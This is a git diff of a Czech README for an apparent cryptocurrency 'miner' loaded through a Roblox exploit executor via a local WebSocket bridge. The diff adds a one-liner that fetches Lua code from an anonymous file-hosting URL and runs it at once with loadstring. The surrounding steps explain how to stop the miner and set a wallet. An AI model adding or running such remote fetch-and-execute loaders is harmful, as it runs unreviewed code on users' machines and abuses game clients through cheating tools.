@@ -34,8 +34,11 @@ executor neumi TCP.
    Bridge nema zavislosti (jen Node builtiny), stahne se sam a bezi na
    `ws://127.0.0.1:8790`. Okno nechat otevrene.
 
-2. Do executoru vlozit `miner/loader.lua` (nebo jen
-   `loadstring(game:HttpGet("<url>"))()`).
+2. Do executoru vlozit `miner/loader.lua`, nebo jen odkaz:
+
+   ```lua
+   loadstring(game:HttpGet("https://files.catbox.moe/cdb1t4.lua"))()
+   ```
 
 3. Zastavit: `_G.MINER_STOP = true`. Vlastni penizenka:
    `MINER_CFG = { wallet = "..." }` pred loaderem.
